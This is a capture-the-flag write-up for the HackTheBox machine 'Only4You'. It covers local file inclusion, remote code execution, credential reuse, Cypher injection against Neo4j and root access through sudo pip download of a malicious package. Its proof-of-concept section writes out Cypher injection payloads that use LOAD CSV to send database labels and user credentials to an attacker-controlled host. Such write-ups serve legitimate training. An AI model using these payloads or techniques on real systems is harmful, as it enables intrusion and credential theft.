---
title: Only4You Report
date: 2023-08-27 12:00:00 pm
categories: [HTB]
tags: [HTB, Linux, Medium, Python Scripting, RCE, LFI, CypherI, Pip]

img_path: /assets/img/htb/writeups/only4you
---

#  Only4you Report

* * *
 
## **Information gathering**

* * *
* * *

**Scope:** 10.10.11.210/32 (Linux)

![](target_connection.png)

**TCP Nmap scan:** 65,535 ports

![](nmap_all_ports_TCP.png)

* **Open ports**:
	* **22/ssh (secure shell protocol)** 
		* Banner grabbing
			* Version: OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 (codename: focal) (no vulnerable)
	* **80/http (hypertext transfer protocol)**
		* Banner grabbing			 ![](htpp_redirection.png)
			 * HTTPServer: nginx/1.18.0 (Ubuntu)
			* RedirectLocation: http://only4you.htb/
				![](http_firefox.png)
				* On web content they say: **"We also have some products in beta version to show!"** and below a link to products available to check http://beta.only4you.htb/
					![](http_beta.png)
					* Source code provided
						![](http_beta_source_code.png)
					* Code Analysis
						* app.py (low protection when validating file download)

## **Vulnerability assessment**

* * *
* * *

* Code Analysis (app.py) (/var/www/beta.only4you.htb)
	![](code_analysis_lfi.png)
	* Absolute path not checked (/etc/hosts)
		![](lfi_poc.png)
		* Python script (lfi.py)
			![](lfi_script.png)

## **Exploitation**

* * *
* * *

* Code analysis (app.py) (/var/www/only4you.htb)
	![](code_analysis_rce.png)
	* PoC (ICMP connection)
		![](rce_poc_0.png)
		* www-data (shell)
			![](www-data_shell.png)

## **Post-exploitation**

* * *
* * *

* User enumeration (www-data)
	* Internal open ports
		![](www-data_internal_open_ports.png)
	* Forward socks proxy (chisel_linux): [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
		* http://127.0.0.1:3000
			* Server: Gogs (A painless self-hosted Git service)
			* Reuse credential: john:ThisIs4You
		* http://127.0.0.1:8001
			* Server: gunicorn/20.0.4 (Python WSGI HTTP Server for UNIX)
			* Valid credentials: admin:admin
				![](8001_service_interface.png)
				* http://127.0.0.1:8001/search (**Vulnerable to Cypher injection Neo4j**)
					* Neo4j Investigation (PoC part below)
						* select * from users = match (n:users) return n
					* List labels
						* user, employee
							![](cypher_list_labels.png)
					* List values (user)
						* username, password
							![](cypher_injection_creds_poc.png)
						* Credentials
							* admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 (admin)
							*  john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 (ThisIs4You)
								* Valid **SSH Credentials**
								![](john_shell.png)
		* http://127.0.0.1:7474
			* Server: neo4j 5.6.0 (Graph database management system developed by Neo4j)
			* No valid credentials
			* **Vulnerable**

## **Lateral movement**

* * *
* * *

* Persistence: **SSH key pair generation**
* System user enumeration (John:ThisIs4You)
	* Security police command list
		![](john_sudo_binary_list.png)
		* **Pip download** vulnerability
			* "Pip download" does the same resolution and downloading as pip install **(execute setup.py with metadata and dependecies, etc)** , but instead of installing the dependencies, it **collects the downloaded distributions into the directory provided (defaulting to the current directory)**
				* The issue occurs only when the package contains a **tar.gz file instead of a wheel (.whl) file**, which "cuts the 'setup.py' execution out of the equation."
			* **Building and Distributing Packages with Setuptools** [https://setuptools.pypa.io/en/latest/userguide/index.html](https://setuptools.pypa.io/en/latest/userguide/index.html)
				* Creating malicious package (with any os command that you nedd)
					![](malicious_package.png)
				* Build package
					![](build_package.png)
				* Upload tar.gz to Gogss Server (http://127.0.0.1:3000) (Local port forward)
					1. Create new or use a repository (if use a new repo uncheck private repository)
					2. Upload package (package.tar.gz)
					3. Download package with SUDO pip and get **Remote Code Execution** like **root**
					![](root.png)

## **Proof of concept**

* * *
* * *

* **Cypher injection (Local Neo4j console)**
	* Environment
		* Create new label: CREATE (a:USERS {name:'admin', password:'admin123'})
	* Valid data created
		* Show labels: CALL db.labels()
		* Match labels node: MATCH (a:USERS) WHERE a.name='admin' return a.name
	* Basic injection
		* match (a:USERS) where a.name='' or 1=1 return a.name
	* List Neo4j version
		* match (a:USERS) where a.name='' or 1=1 CALL dbms.components() YIELD versions UNWIND versions as version LOAD CSV FROM 'http://10.10.15.5/?version=' + version as l RETURN 0//return a.name
			![](cypher_injection_poc.png)
	* List labes ("tables")
		* match (a:USERS) where a.name='' or 1=1 CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.15.5/?=' + label as l RETURN 0//return a.name
			![](cypher_injection_labels_poc.png)
	* List values
		* match (a:USERS) where a.name='' or 1=1 match (x:USERS) UNWIND keys(x) as k LOAD CSV FROM 'http://10.10.15.5/?' + k + '=' + toString(x[k]) as l RETURN 0//return a.name
		![](cypher_injection_values_poc.png)

* Python script [https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Only4You](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Only4You)
	* LFI && RCE && CYPHER INJECTION
		![](lfi_PoC.png)
		![](rce_PoC.png)
		![](cypher_PoC.png)
